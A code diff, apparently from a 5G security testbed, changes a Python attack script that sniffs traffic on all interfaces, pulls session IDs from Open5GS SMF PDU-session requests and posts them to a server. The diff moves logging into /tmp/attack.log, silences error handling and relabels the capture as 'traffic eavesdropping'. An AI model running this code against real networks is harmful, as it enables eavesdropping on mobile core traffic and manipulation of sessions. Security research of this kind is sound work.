@@ -9,7 +9,8 @@ import time
 import re
 
 # Configure logging
-logging.basicConfig(level=logging.INFO,
+logging.basicConfig(filename='/tmp/attack.log',
+                    level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
 URI_PATTERN = "http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/"
@@ -57,10 +58,12 @@ def process_with_tshark(packet):
                             post_to_server(ip_src, session_id)
 
         except subprocess.CalledProcessError as e:
-            logging.warning(
-                f"Tshark processing error: {e.output.decode('utf-8')}")
+            pass
+            # logging.warning(
+            #     f"Tshark processing error: {e.output.decode('utf-8')}")
         except Exception as e:
-            logging.warning(f"Error processing packet with tshark: {e}")
+            pass
+            # logging.warning(f"Error processing packet with tshark: {e}")
         finally:
             # Clean up the temporary .pcap file
             if os.path.exists(TEMP_PCAP):
@@ -107,15 +110,17 @@ def post_to_server(ip_src, session_id):
             )
 
     except subprocess.CalledProcessError as e:
-        logging.warning(f"Error sending POST request: {e}")
+        pass
+        # logging.warning(f"Error sending POST request: {e}")
     except Exception as e:
-        logging.warning(f"Unexpected error: {e}")
+        pass
+        # logging.warning(f"Unexpected error: {e}")
 
 
 def run(attack_enabled=False):
     # Start sniffing packets
     if attack_enabled == "true":
-        logging.info("Starting packet capture...")
+        logging.info("Starting traffic eavesdropping...")
         sniff(iface=os.listdir('/sys/class/net/'),
               filter="tcp src port 80",
               prn=process_with_tshark)
